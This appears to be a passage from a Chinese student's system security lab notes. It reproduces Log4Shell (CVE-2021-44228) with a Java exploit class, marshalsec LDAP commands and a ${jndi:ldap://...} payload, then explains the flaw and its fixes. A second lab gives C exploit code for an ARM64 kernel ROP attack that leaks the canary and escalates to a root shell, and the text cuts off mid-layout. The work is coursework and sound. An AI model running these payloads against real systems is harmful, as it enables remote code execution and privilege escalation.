\u53ef\u4ee5\u6b63\u5e38\u767b\u5f55\u3002</p> <p>\u63a5\u4e0b\u6765\u7f16\u5199 Exploit \u811a\u672c\uff0c\u7c7b\u4f3c\u524d\u9762\u7684\u6253\u5f00\u8ba1\u7b97\u5668\uff0c\u8fd9\u91cc\u9700\u8981\u5f00\u542f python HTTP \u670d\u52a1\uff1a</p> <pre><code>public class Exploit {\n    static {\n        System.out.println(\"Executing exploit!\");\n        System.out.println(\"Attack!\");\n        try {\n            String[] cmds = {\"python\", \"-m\", \"http.server\", \"8888\", \"--directory\", \"..\"};\n            java.lang.Runtime.getRuntime().exec(cmds).waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre> <p>\u7136\u540e\u540c\u6837\u672c\u5730\u5f00\u542f HTTP \u670d\u52a1\u548c LDAP \u670d\u52a1\uff1a</p> <pre><code>python -m http.server 8100\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8100/#Exploit\"\n</code></pre> <p>\u63a5\u4e0b\u6765\u5728\u7528\u6237\u540d\u5904\u8f93\u5165 ${jndi:ldap://127.0.0.1:1389/Exploit} \u5e76\u767b\u5f55\uff0c\u5373\u53ef\u89e6\u53d1\u6f0f\u6d1e\uff0c\u5728\u670d\u52a1\u5668\u4e0a RCE\uff0c\u5f00\u542f 8888 \u7aef\u53e3\u4e0a\u7684\u670d\u52a1\u3002\u53ef\u4ee5\u53d1\u73b0 LDAP \u548c HTTP \u670d\u52a1\u4e2d\u51fa\u73b0\u4e86\u8bf7\u6c42\uff0cwj \u670d\u52a1\u4e2d\u4e5f\u6267\u884c\u4e86 Exploit.class \u51fa\u73b0\u4e86\u8f93\u51fa\uff1a</p> <p>\u540c\u65f6\u53ef\u4ee5\u901a\u8fc7 8888 \u7aef\u53e3\u6765\u8bbf\u95ee web \u670d\u52a1\u7684\u6e90\u6587\u4ef6\uff1a</p>"},{"location":"sec/syssec/lab1/#_3","title":"\u601d\u8003\u9898","text":"<ol> <li>\u89e3\u91ca\u5b9e\u9a8c 1\uff08\u672c\u5730\u5f39\u8ba1\u7b97\u5668\uff09\u7684\u6f0f\u6d1e\u89e6\u53d1\u8fc7\u7a0b</li> </ol> <p>\u4e0b\u9762\u7684\u5206\u6790\u6765\u81ea\u672c\u4eba\u5728\u5927\u4e00\u6625\u590f\u201c\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5bfc\u8bba\u201d\u8bfe\u7a0b\u62a5\u544a log4j \u6f0f\u6d1e\u590d\u73b0\u4e2d\u7684\u5206\u6790\u3002</p> <p>JNDI \u6ce8\u5165\u539f\u7406\uff1a</p> <p>JNDI \u5c01\u88c5\u4e86\u4e00\u4e9b\u670d\u52a1\uff0c\u5e76\u4e14\u901a\u8fc7 lookup \u6765\u8bbf\u95ee\u670d\u52a1\uff0c\u4f8b\u5982\u901a\u8fc7 lookup(\"rmi://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee ip:port \u63d0\u4f9b\u7684 RMI \u670d\u52a1\uff0c\u901a\u8fc7 lookup(\"ldap://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee LDAP \u670d\u52a1\u3002</p> <p>JNDI \u7684\u76ee\u7684\u662f\u901a\u8fc7\u540d\u79f0/\u76ee\u5f55\u83b7\u53d6\u5bf9\u8c61\uff0c\u800c\u8fdc\u7a0b\u8bfb\u53d6\u7684\u4e00\u822c\u662f\u7f16\u8bd1\u540e\u7684 .class \u6587\u4ef6\u6240\u4ee5\u5728 lookup \u65f6\u4f1a\u8fdb\u884c\u7c7b\u52a0\u8f7d\uff0cJVM \u5c06\u5176\u52a0\u8f7d\u4e3a Java \u7c7b\u3002\u800c\u5f53 ClassLoader \u52a0\u8f7d .class \u6587\u4ef6\u7684\u65f6\u5019\u4f1a\u8c03\u7528\u7c7b\u7684 clinit \u65b9\u6cd5\uff0c\u6267\u884c\u7c7b\u7684\u9759\u6001\u4ee3\u7801\u3002\u56e0\u6b64\u5982\u679c\u53ef\u4ee5\u63a7\u5236 JNDI lookup \u7684 URL\uff0c\u4fbf\u53ef\u4ee5\u4efb\u610f\u52a0\u8f7d\u8fdc\u7a0b\u7c7b\uff0c\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u4e5f\u5c31\u662f JNDI \u6ce8\u5165\u539f\u7406\u3002</p> <p>\u4f46\u662f JNDI \u6ce8\u5165\u53d7\u5230 JDK \u914d\u7f6e\u9650\u5236\uff0c\u5982\u679c com.sun.jndi.xxx.object.trustURLCodebase \u8fd9\u4e00\u914d\u7f6e\u662f false \u65f6\u5219\u4e0d\u4f1a\u4fe1\u4efb URL \u4ece\u800c\u65e0\u6cd5\u8fdb\u884c JNDI \u6ce8\u5165\u3002\u5728 JDK 11.0.1\u30018u191\u30017u201\u30016u211 \u7b49\u7248\u672c\u4e2d\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u662f true\uff0c\u800c\u4ece 6u132\u30017u122\u30018u113 \u5f00\u59cb\uff0c\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u4e3a false\uff08\u56e0\u6b64\u540e\u9762\u4f7f\u7528\u9ad8\u7248\u672c JDK \u590d\u73b0\u65f6\u8981\u624b\u52a8\u5f00\u542f\u8fd9\u4e00\u914d\u7f6e\uff09</p> <p>CVE-2021-44228 \u6f0f\u6d1e\u539f\u7406\uff1a</p> <p>CVE-2021-44228 \u5373\u662f\u901a\u8fc7 log4j \u6765\u5b9e\u73b0\u4e86 JNDI \u6ce8\u5165\u3002log4j \u53ef\u4ee5\u901a\u8fc7 ${} \u8bed\u6cd5\u6765\u83b7\u53d6\u52a8\u6001\u5185\u5bb9\u5e76\u8f93\u51fa\u5230\u65e5\u5fd7\u4e2d\uff0c\u5176\u4e2d\u5bf9\u4e8e\u6bcf\u4e2a ${} \u90e8\u5206\u4f7f\u7528 lookup \u65b9\u6cd5\u6765\u89e3\u51b3\u53d8\u91cf\uff0c\u5176\u4e2d\u4e5f\u63d0\u4f9b\u4e86 JndiLookup\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u4f7f\u7528 JNDI \u6765\u8bfb\u53d6\u5185\u5bb9\uff0c\u5f62\u5982 ${jndi:...}\u3002\u8fd9\u65f6\u5c31\u5b58\u5728 JNDI \u6ce8\u5165\u3002</p> <p>\u800c\u5927\u90e8\u5206\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u7684\u7f51\u7edc\u5e94\u7528\u90fd\u4f1a\u8bb0\u5f55\u7528\u6237\u7684\u8f93\u5165\uff0c\u6bd4\u5982\u641c\u7d22\u7f51\u7ad9\u4f1a\u8bb0\u5f55\u7528\u6237\u641c\u7d22\u7684\u5185\u5bb9\uff0c\u8fd9\u65f6\u5982\u679c\u7528\u6237\u8f93\u5165\u7684\u662f ${jndi:...}\uff08\u6bd4\u5982 ${jndi:ldap://ip:port/...}\uff09 \u5c31\u4f1a\u8fdb\u884c JndiLookup\uff0c\u5b9e\u73b0 JNDI \u6ce8\u5165\uff0c\u8fd9\u4e5f\u5c31\u662f CVE-2021-44228 \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u539f\u7406\u3002</p> <p>\u6f0f\u6d1e\u89e6\u53d1\u8fc7\u7a0b\u5206\u6790\uff1a</p> <p>\u901a\u8fc7\u8c03\u8bd5\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\u53ef\u4ee5\u83b7\u53d6\u5230\u6574\u4e2a\u7a0b\u5e8f\u7684\u8c03\u7528\u6808\uff1a</p> <p><pre><code>&lt;clinit&gt;:11, Exploit\nforName0:-1, Class (java.lang)\nforName:348, Class (java.lang)\nloadClass:91, VersionHelper12 (com.sun.naming.internal)\nloadClass:101, VersionHelper12 (com.sun.naming.internal)\nloadClass:115, VersionHelper12 (com.sun.naming.internal)\ngetObjectFactoryFromReference:163, NamingManager (javax.naming.spi)\ngetObjectInstance:189, DirectoryManager (javax.naming.spi)\nc_lookup:1114, LdapCtx (com.sun.jndi.ldap)\np_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)\nlookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)\nlookup:205, GenericURLContext (com.sun.jndi.toolkit.url)\nlookup:94, ldapURLContext (com.sun.jndi.url.ldap)\nlookup:417, InitialContext (javax.naming)\nlookup:172, JndiManager (org.apache.logging.log4j.core.net)\nlookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)\nlookup:221, Interpolator (org.apache.logging.log4j.core.lookup)\nresolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)\nsubstitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)\nsubstitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)\nreplace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)\nformat:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)\nformat:38, PatternFormatter (org.apache.logging.log4j.core.pattern)\ntoSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)\ntoText:244, PatternLayout (org.apache.logging.log4j.core.layout)\nencode:229, PatternLayout (org.apache.logging.log4j.core.layout)\nencode:59, PatternLayout (org.apache.logging.log4j.core.layout)\ndirectEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)\ntryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)\nappend:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)\ntryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)\ncallAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)\ncallAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)\ncallAppender:84, AppenderControl (org.apache.logging.log4j.core.config)\ncallAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)\nprocessLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)\nlog:481, LoggerConfig (org.apache.logging.log4j.core.config)\nlog:456, LoggerConfig (org.apache.logging.log4j.core.config)\nlog:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)\nlog:161, Logger (org.apache.logging.log4j.core)\ntryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)\nlogMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)\nlogMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)\nlogMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)\nlogIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)\nerror:740, AbstractLogger (org.apache.logging.log4j.spi)\nmain:11, log4j\n</code></pre> \u53ef\u4ee5\u8f83\u6e05\u6670\u5730\u5206\u6790\u51fa\u6765\u7a0b\u5e8f\u8fdb\u5165\u6267\u884c logger.error\uff0c\u7136\u540e\u5728 log \u4e2d\u9010\u5c42\u8c03\u7528\u6700\u7ec8\u8c03\u7528\u5230 resolveVariable \u5373\u5904\u7406 ${} \u53d8\u91cf\uff0c\u7136\u540e\u8c03\u7528\u5230\u4e86 Interpolator \u7684 lookup \u65b9\u6cd5\uff0c\u5176\u4e2d\u5bfb\u627e\u5230\u4e86 JndiLookup \u7c7b\uff0c\u8c03\u7528\u5176 lookup \u65b9\u6cd5\uff0c\u4ece LDAP \u670d\u52a1\u83b7\u53d6\u7c7b\uff0c\u7136\u540e\u4ece\u4e2d getObjectInstance\uff0c\u8fd9\u91cc\u4f1a\u8fdb\u884c loadClass \u64cd\u4f5c\uff0c\u800c\u5176\u4e2d\u8c03\u7528\u4e86 Exploit \u7c7b\u9690\u85cf\u7684 clinit \u65b9\u6cd5\u4e5f\u5c31\u662f\u9759\u6001\u4ee3\u7801\uff0c\u9020\u6210 RCE\u3002</p> <ol> <li>\u5982\u4f55\u9632\u62a4 Apache Log4j2 \u6f0f\u6d1e</li> </ol> <p>\u4e0b\u9762\u7684\u5206\u6790\u6765\u81ea\u672c\u4eba\u5728\u5927\u4e00\u6625\u590f\u201c\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5bfc\u8bba\u201d\u8bfe\u7a0b\u62a5\u544a log4j \u6f0f\u6d1e\u590d\u73b0\u4e2d\u7684\u5206\u6790\u3002</p> <p>\u9ad8\u7248\u672c\u7684 JDK \u4e2d\u8bbe\u7f6e\u4e86 com.sun.jndi.xxx.object.trustURLCodebase \u9ed8\u8ba4\u4e3a false\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u4e00\u90e8\u5206 JNDI \u6ce8\u5165\u7684\u53d1\u751f\u3002</p> <p>\u5728 CVE-2021-42288 \u53d1\u5e03\u540e\uff0cApache \u901a\u8fc7 #608 \u8fd9\u4e2a pull request \u6765\u5bf9 LDAP \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u5e76\u53d1\u5e03\u4e86 2.15.0-rc1 \u7248\u672c\u3002\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u5b58\u5728\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u5373\u901a\u8fc7\u6784\u9020\u51fa\u4f1a\u629b\u51fa\u5f02\u5e38\u7684 payload \u5c31\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u9a8c\u3002</p> <p>\u968f\u540e Apache \u53c8\u8fdb\u884c\u4e86\u5bf9\u4e8e\u5f02\u5e38 URI \u7684\u5904\u7406\uff0c\u53d1\u5e03\u4e86 2.15.0-rc2 \u7248\u672c\uff0c\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u4f1a\u901a\u8fc7\u8f83\u590d\u6742\u7684\u7ed5\u8fc7\u5b9e\u73b0 RCE\u3002\u56e0\u6b64\u5728 2.16.0-rc1 \u7248\u672c\u4e2d\uff0cMessage Lookups \u88ab\u5f7b\u5e95\u5220\u9664\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u88ab\u89e6\u53d1\u7684\u60c5\u51b5\u5c31\u66f4\u5c11\u4e86\uff0c\u4f46\u5982\u679c\u5f00\u53d1\u8005\u624b\u52a8\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u4ecd\u6709\u53ef\u80fd\u901a\u8fc7\u4e00\u7cfb\u5217\u7ed5\u8fc7\u5b9e\u73b0\u6ce8\u5165\u3002</p> <p>\u4f46\u662f\u5728 2.16.0 \u7248\u672c\u4e2d\u5982\u679c\u6ca1\u6709\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u53cc\u5c42\u5d4c\u5957\u7684 ${${...}} \u4f1a\u5bfc\u81f4\u65e0\u9650\u9012\u5f52\uff0c\u4ece\u800c\u9020\u6210 DoS \u653b\u51fb\uff0c\u8fd9\u4e5f\u5c31\u662f\u540e\u7eed\u7684 CVE-2021-45046 \u8fd9\u4e2a\u6f0f\u6d1e\u3002\u968f\u540e\u5728 2.17.0 \u7248\u672c\u4e2d Apache \u4fee\u590d\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5e76\u4e14\u9650\u5236\u5373\u4f7f\u5f00\u542f\u4e86 JNDI \u529f\u80fd\uff0c\u5176\u4ec5\u652f\u6301 java \u534f\u8bae\u800c\u4e0d\u652f\u6301 ldap\uff0c2.15.0-rc2 \u548c 2.16.0 \u4e2d\u7684\u7ed5\u8fc7\u4e5f\u65e0\u6548\u4e86\u3002\u56e0\u6b64 2.17.0 \u4e5f\u5c31\u6210\u4e3a\u4e86\u53ef\u4ee5\u5b8c\u5168\u9632\u6b62\u8fd9\u4e00\u6f0f\u6d1e\u7684 log4j \u7248\u672c\u4e86\u3002</p>"},{"location":"sec/syssec/lab2/","title":"Linux \u5185\u6838 ROP \u653b\u51fb\u4e0e\u9632\u62a4","text":"<p> \u7ea6 2047 \u4e2a\u5b57  174 \u884c\u4ee3\u7801  5 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Abstract</p> <p>\u7cfb\u7edf\u5b89\u5168 lab2 \u5b9e\u9a8c\u62a5\u544a</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"sec/syssec/lab2/#_1","title":"\u5b9e\u9a8c\u76ee\u6807","text":"<ul> <li>\u4e86\u89e3 ARM64 \u6808\u7684\u5e03\u5c40\uff0c\u5b66\u4e60 buffer overflow \u6f0f\u6d1e\u7684\u539f\u7406\u4e0e\u5229\u7528\u65b9\u5f0f</li> <li>\u4e86\u89e3 stack canary \u4e0e KASLR \u7b49\u62b5\u5fa1 buffer overflow \u6f0f\u6d1e\u7684\u539f\u7406\uff0c\u5e76\u5b66\u4f1a\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e9b\u9632\u62a4\u673a\u5236</li> <li>\u5b66\u4e60 return-oriented programming (ROP) \u653b\u51fb\u539f\u7406\uff0c\u83b7\u53d6 Linux \u5185\u6838\u7684 root \u6743\u9650</li> <li>\u5b66\u4e60 ARMV8.3 PA (Pointer Authentication) \u539f\u7406\uff0c\u4e86\u89e3 Linux \u5185\u6838\u5982\u4f55\u5229\u7528 PA \u673a\u5236\u9632\u6b62 ROP \u653b\u51fb</li> </ul>"},{"location":"sec/syssec/lab2/#_2","title":"\u5b9e\u9a8c\u8fc7\u7a0b","text":""},{"location":"sec/syssec/lab2/#task-1","title":"Task 1","text":"<p>\u9700\u8981\u6cc4\u6f0f\u51fa canary \u503c\u5e76\u4e14\u6839\u636e ra \u8ba1\u7b97\u51fa\u5f53\u524d KASLR \u7684\u504f\u79fb\u503c\u3002\u9996\u5148\u89c2\u5bdf zjubof_read \u548c zjubof_write4 \u7684\u4ee3\u7801\uff1a</p> <pre><code>static ssize_t zjubof_read (struct file *file, char __user *buffer, size_t len, loff_t *offset)\n{\n    int ret = 0;\n    if(len &gt;= CMD_LENGTH)\n        return -EINVAL;\n    ret = copy_to_user(buffer, prev_cmd, len);\n    return ret;\n}\n\nssize_t zjubof_write4(char *buffer,size_t len)\n{\n    struct cmd_struct cmd;   \n    printk(\"zjubof_write4\\n\");\n    memset(cmd.command, 0, 16);\n    cmd.length = len;\n    if(cmd.length &gt; 16)\n        cmd.length = 16;\n    memcpy(cmd.command, buffer, len);\n    memcpy(prev_cmd,cmd.command, cmd.length);\n    printk(\"cmd :%s len:%ld\\n\", cmd.command,len);\n    return 0;\n}\n</code></pre> <p>read \u4ece\u5168\u5c40\u53d8\u91cf prev_cmd \u4e2d\u83b7\u53d6 len \u957f\u5ea6\u7684\u503c\u3002write \u89c4\u5b9a cmd.length \u4e0d\u8d85\u8fc7 16\uff0c\u4f46 memcpy \u65f6\u5148\u7528\u7684 len\uff0c\u6b64\u5904\u53ef\u4ee5\u6ea2\u51fa\u8986\u76d6\u6389 cmd.length\uff0c\u540e\u9762\u5c31\u53ef\u4ee5\u5c06\u6cc4\u6f0f\u7684\u5185\u5bb9\u5199\u5165 prev_cmd \u4f9b\u8bfb\u53d6\u4e86\u3002\u901a\u8fc7 objdump \u6211\u4eec\u77e5\u9053 cmd \u5728 zjubof_write4 \u7684\u6700\u5e95\u7aef\uff0c\u53ef\u4ee5\u76f4\u63a5\u6ea2\u51fa\u5230 zjubof_write3 \u7684\u51fd\u6570\u5e27\u6808\u4e2d\uff0c\u6574\u4f53\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>buf+00  cmd.command[0:8]    \u2510\nbuf+08  cmd.command[8:16]   \u251c zjubof_write4\nbuf+16  cmd.length          \u2518\nbuf+24  canary              \u2510\nbuf+32  old frame pointer   \u251c zjubof_write3\nbuf+40  return address      \u2518\n</code></pre> <p>\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u5199\u5165 16+8 \u4e2a\u5b57\u8282\uff0c\u524d 16 \u4e2a\u5b57\u8282\u5360\u6ee1 cmd.command\uff0c\u540e 8 \u4e2a\u5b57\u8282\u8986\u76d6\u6389 cmd.length \u4fee\u6539\u4e3a 48 \u5c31\u53ef\u4ee5\u5c06\u4e0a\u8ff0 6 \u4e2a\u516b\u5b57\u8282\u7684\u503c\u590d\u5236\u5230 prev_cmd \u4e2d\uff0c\u518d\u901a\u8fc7 read \u6cc4\u6f0f\u51fa\u6765\u3002</p> <p>\u5f97\u5230 ra \u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6839\u636e zjubof_write2 \u4e2d\u8c03\u7528 zjubof_write3 \u65f6\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u4e0e\u5b58\u5728\u6808\u4e0a\u7684 lr \u6bd4\u8f83\u6765\u8ba1\u7b97\u51fa KASLR \u7684\u504f\u79fb\u91cf\uff1a</p> <pre><code>ffff800010de7cb4 &lt;zjubof_write2&gt;:\n...\nffff800010de7d08:   97ffffdc    bl  ffff800010de7c78 &lt;zjubof_write3&gt;\nffff800010de7d0c:   f9410fe0    ldr x0, [sp, #536]\n...\n</code></pre> <p>\u4e3a\u4e86\u66f4\u65b9\u4fbf\u5730\u8fdb\u884c 8 \u5b57\u8282 buffer \u4e0e size_t \u503c\u7684\u8f6c\u6362\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a struct+union\uff1a</p> <pre><code>struct uint64_mem {\n    union {\n        size_t val;\n        char buf[8];\n    };\n} canary, ra;\n</code></pre> <p>\u8fd9\u6837\u901a\u8fc7 canary.buf \u8fdb\u884c\u7684\u8d4b\u503c\u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 canary.val \u8bfb\u53d6\u3002\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;stdlib.h&gt;\n\nsize_t original_ra = 0xffff800010de7d0c, offset;\n\nstruct uint64_mem {\n    union {\n        size_t val;\n        char buf[8];\n    };\n} canary, ra;\n\nvoid leak_info(int fd) {\n    char buf[0x100] = \"AAAAAAAAAAAAAAAA\\x30\";\n    write(fd, buf, 16 + 8);\n    read(fd, buf, 48);\n    memcpy(canary.buf, buf + 24, 8);\n    memcpy(ra.buf, buf + 40, 8);\n    printf(\"[+] canary: \\t0x%lx\\n\", canary.val);\n    printf(\"[+] ra: \\t0x%lx\\n\", ra.val);\n    offset = ra.val - original_ra;\n    printf(\"[+] offset: \\t0x%lx\\n\", offset);\n}\n\nint main() {\n    int fd = open(\"/dev/zjubof\", O_RDWR);\n    if (fd &lt; 0) {\n        perror(\"open\");\n        return 1;\n    }\n    leak_info(fd);\n    close(fd);\n    return 0;\n}\n</code></pre> <p>\u901a\u8fc7 aarch64-linux-gnu-gcc -static exp.c -o exp \u7f16\u8bd1\u540e\u5c06 exp \u653e\u5165 share \u6587\u4ef6\u5939\u4e2d\u3002\u7136\u540e ./start.sh \u901a\u8fc7 qemu \u542f\u52a8 kernel\uff0c\u5728 kernel \u4e2d cd /mnt/share \u540e ./exp \u5373\u53ef\u8fd0\u884c exp \u5f97\u5230\u6cc4\u6f0f\u7684 canary \u548c offset\uff1a</p>"},{"location":"sec/syssec/lab2/#task-2","title":"Task 2","text":"<p>\u9700\u8981\u4fee\u6539 zjubof_write3 \u7684\u8fd4\u56de\u5730\u5740\uff0c\u8df3\u8f6c\u5230 first_level_gadget \u8fdb\u884c\u63d0\u6743\uff0c\u7136\u540e\u8fd0\u884c shell\u3002\u6808\u7684\u7ed3\u6784\u540c\u6837\u5982\u4e0a\u5206\u6790\uff1a</p> <pre><code>buf+00  cmd.command[0:8]    \u2510\nbuf+08  cmd.command[8:16]   \u251c zjubof_write4\nbuf+16  cmd.length          \u2518\nbuf+24  canary              \u2510\nbuf+32  old frame pointer   \u251c zjubof_write3\nbuf+40  return address      \u2518\n</code></pre> <p>\u53ea\u9700\u8981\u5199\u5165\u4e00\u4e0b\u6784\u9020\u597d\u7684 buf \u5373\u53ef\uff0cTask 1 \u4e2d\u6211\u4eec\u5f97\u5230\u4e86 canary\uff0c\u5728\u8fd9\u91cc\u5199\u5165\u7684\u65f6\u5019\u586b\u5165\u6cc4\u9732\u7684 canary \u5373\u53ef\u7ed5\u8fc7\u6808\u6ea2\u51fa\u4fdd\u62a4\uff0c\u63a5\u7740 fp \u4e0d\u7528\u7ba1\uff0cra \u9700\u8981\u5728 objdump \u627e\u5230\u7684\u9884\u671f\u8df3\u8f6c\u5730\u5740\u4e0a\u52a0\u4e0a KASLR \u504f\u79fb\u91cf\u5373\u53ef\u3002\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u8df3\u8f6c\u5230 first_level_gadget \u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\u5904\uff0c\u56e0\u4e3a\u5728 zjubof_write3 \u8fd4\u56de\u65f6\u6808\u7684\u72b6\u6001\u5df2\u7ecf\u6062\u590d\u5230\u4e86 zjubof_write2 \u7684\u5e27\u6808\uff0c\u8fd9\u91cc\u6211\u4eec\u60f3\u8981\u7684\u662f\u5728\u5b83\u7684\u5e27\u6808\u4e2d\u8fd0\u884c first_level_gadget \u51fd\u6570\uff0c\u4e0d\u9700\u8981\u518d\u8c03\u6574 sp\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u7b2c\u4e00\u6761 stp \u6307\u4ee4\u3002</p> <pre><code>ffff8000107abd78 &lt;first_level_gadget&gt;:\nffff8000107abd78:   a9bf7bfd    stp x29, x30, [sp, #-16]!\nffff8000107abd7c:   d2800000    mov x0, #0x0                    // #0\n...\n</code></pre> <p>\u5728 first_level_gadget \u4e2d\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6700\u540e\u8fd4\u56de\u524d\u5c06 sp \u52a0\u4e86 0x220\uff0c\u8fd9\u662f\u56e0\u4e3a zjubof_write2 \u7684\u5e27\u6808\u5927\u5c0f\u662f 0x220\uff0czjubof_write3 \u7684\u5e27\u6808\u5927\u5c0f\u662f 32\uff0czjubof_write4 \u7684\u5e27\u6808\u5927\u5c0f\u662f 80\u3002\u5728\u6bcf\u4e2a\u51fd\u6570\u8c03\u7528\u7684\u5f00\u5934\u4f1a\u7ed9 sp \u51cf\u53bb\u5e27\u6808\u5927\u5c0f\u6765\u5f00\u8f9f\u7a7a\u95f4\uff0c\u7ed3\u675f\u540e\u7ed9 sp \u52a0\u56de\u6765\u6062\u590d\u5230\u8c03\u7528\u8005\u7684\u5e27\u6808\u3002\u800c\u5728 zjubof_write3 \u8fd4\u56de\u7684\u65f6\u5019\u5df2\u7ecf\u6062\u590d\u5230\u4e86 zjubof_write2 \u7684\u5e27\u6808\uff0c\u8981\u60f3\u5728\u63d0\u6743\u540e\u6b63\u5e38\u8fd4\u56de\u5230 zjubof_write\uff0c\u4e0d\u80fd\u901a\u8fc7\u51fd\u6570\u6b63\u5e38\u7684\u9000\u51fa\u6d41\u7a0b\uff0c\u9700\u8981\u81ea\u5df1\u8fd8\u539f\u73b0\u573a\u5e76\u624b\u52a8 ret \u8fd4\u56de\u3002\u5728\u8fd9\u91cc\u5c31\u4f53\u73b0\u4e3a\u624b\u52a8 load \u56de x29 x30 x19 x20 x21 \u5e76\u5c06 sp \u52a0\u4e0a 0x220\uff0c\u7136\u540e ret \u5373\u53ef\u8fd4\u56de\u5230 zjubof_write2 \u7684\u5e27\u6808\u4e2d\u3002</p> <p>\u8fd9\u90e8\u5206\u7684 exp \u5982\u4e0b\uff1a</p> <pre><code>size_t first_level_gadget = 0xffff8000107abd7c;\n\nvoid task2(int fd) {\n    char buf[0x100] = {0};\n    struct uint64_mem fake_ra;\n    fake_ra.val = first_level_gadget + offset;\n    memcpy(buf + 24, canary.buf, 8);\n    memcpy(buf + 40, fake_ra.buf, 8);\n    write(fd, buf, 48);\n    system(\"/bin/sh\");\n}\n</code></pre> <p>\u5728 Task 1 \u7684\u57fa\u7840\u4e0a leak_info \u540e\u8c03\u7528 task2(fd) \u5373\u53ef\u5b8c\u6210\u63d0\u6743\uff1a</p> <p>\u53ef\u89c1\u8fd0\u884c /bin/sh \u65f6\u7684\u7528\u6237\u53d8\u4e3a\u4e86 root\uff0c\u4e14\u53ef\u4ee5\u8bfb\u53d6\u5230 flag \u5185\u5bb9\u4e3a sysde655sEc\u3002</p>"},{"location":"sec/syssec/lab2/#task-3","title":"Task 3","text":"<p>\u5728\u8fd9\u4e2a task \u4e2d\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7 first_level_gadget \u63d0\u6743\uff0c\u9700\u8981\u624b\u52a8\u8c03\u7528 prepare_kernel_cred \u548c commit_creds \u63d0\u6743\uff0c\u7136\u540e\u518d\u901a\u8fc7 second_level_gadget \u8df3\u56de zjubof_write\u3002\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8986\u76d6\u66f4\u591a\u6808\u7a7a\u95f4\uff0c\u5c06\u6574\u4e2a\u6808\u5e03\u5c40\u4e3a\u5982\u4e0b\uff1a</p> <pre><code>buf+000 cmd.command[0:8]    \u2510\nbuf+008 cmd.command[8:16]   \u251c zjubof_write4\nbuf+016 cmd.length          \u2518\nbuf+024 canary              \u2510\nbuf+032 old frame pointer   \u251c zjubof_write3\nbuf+040 return address      \u2502                  -&gt; to prepare_kernel_cred\nbuf+048                     \u2502\nbuf+056                     \u2518\nbuf+064 old frame pointer   \u2510\nbuf+072 return address      \u2502                  -&gt; to commit_creds\nbuf+080                     \u251c prepare_kernel_cred\nbuf+088                     \u2518\nbuf+096 old frame pointer   \u2510\nbuf+104 return address      \u2502                  -&gt; to second_level_gadget\nbuf+112                     \u251c commit_creds\nbuf+120                     \u2502\nbuf+128                     \u2502\nbuf+136                     \u2518\nbuf+144 old frame pointer   \u2510\nbuf+152 return address      \u2502                  -&gt; to 